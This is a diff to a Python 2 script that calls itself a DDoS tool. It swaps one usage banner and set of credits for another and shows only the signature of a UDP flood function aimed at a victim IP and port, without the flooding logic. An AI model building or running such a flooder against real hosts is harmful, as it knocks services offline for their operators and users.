@@ -3,21 +3,14 @@ import socket
 import random
 import sys
 def usage():
-    print "\033[1;32m#########################################################"
-    print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
-    print "#-------------------------------------------------------#"
-    print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
-    print "#                                                       #"
-    print "#\033[1;91mCreator:KeepAlive  \033[1;32m##      ###       ##                #"
-    print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
-    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
-    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
-    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
-    print "#               \033[1;91m<--[Indonesia Security Lite]-->         \033[1;32m#"
-    print "#########################################################"
-    print "                        @@@@@@@@@@"
-    print "                       @@@@@@@@@@@@"
-    print "                     @@@@@@@@@@@@@@@@"
+    print "\33[32;1m=================================================="
+    print "                      \33[31;1mCommand :"
+    print "       \33[31;1mpython2 attack.py (ip) (port) (packet)"
+    print " "
+    print " "
+    print "                  \33[1;33mThanks To : RoniYT"
+    print "\33[1;33mLink YT : https://m.youtube.com/channel/UCNHZbNTS69kwCYJ8jcLzUzQ/"
+    print "\33[32;1m=================================================="
 def flood(victim, vport, duration):
     # Support us yaakk... :)
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
